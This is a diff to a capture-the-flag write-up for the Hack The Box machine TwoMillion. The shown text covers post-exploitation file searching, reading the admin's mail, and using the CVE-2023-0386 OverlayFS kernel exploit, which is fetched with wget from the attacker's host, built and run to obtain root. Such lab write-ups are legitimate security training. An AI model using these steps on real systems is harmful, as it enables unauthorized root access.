@@ -492,7 +492,7 @@ Standard post-exploitation: check what files belong to this user.
 find / -user admin 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
 ```
 
-![[find_things_user_admin_owns.png]]
+![[find things user admin owns.png]]
 
 ```
 /home/admin
@@ -513,8 +513,7 @@ find / -user admin 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
 cd /var/mail
 cat admin
 ```
-
-![[found_massege_in_mail_directory.png]]
+![[found massege in mail directory.png]]
 
 ```
 From: ch4p <ch4p@2million.htb>
@@ -544,7 +543,6 @@ CVE-2023-0386 is a Linux kernel privilege escalation in the OverlayFS filesystem
 The attack works by creating a fake FUSE filesystem, planting a SUID binary inside an OverlayFS overlay on top of it, and triggering the kernel to execute it. The kernel copies the file without stripping its capabilities, giving you root execution. It needs two terminals working simultaneously — one runs the fake filesystem, the other triggers the exploit binary.
 
 ### Downloading and building
-
 On my attacker machine I cloned the public PoC:
 
 ```bash
@@ -564,7 +562,7 @@ wget http://10.10.17.239/cve-2023-0386.tar.bz2
 tar -xjf cve-2023-0386.tar.bz2
 ```
 
-![[downloaded_kernel_exploit.png]]
+![[downloaded kernel exploit.png]]
 
 The files transferred successfully. You can see both terminals in the screenshot — the attacker serving files on the left and the target pulling them down on the right.
 
@@ -574,6 +572,7 @@ The exploit needs two terminals. In **Terminal 1** (on the target):
 
 ```bash
 cd CVE-2023-0386
+make all
 ./fuse ./ovlcap/lower ./gc
 ```
 
@@ -619,9 +618,6 @@ root@2million:/root# cat root.txt
 ![[finished.png]]
 
 **TwoMillion solved.**
-
----
-
 ## The Full Attack Chain
 
 ```
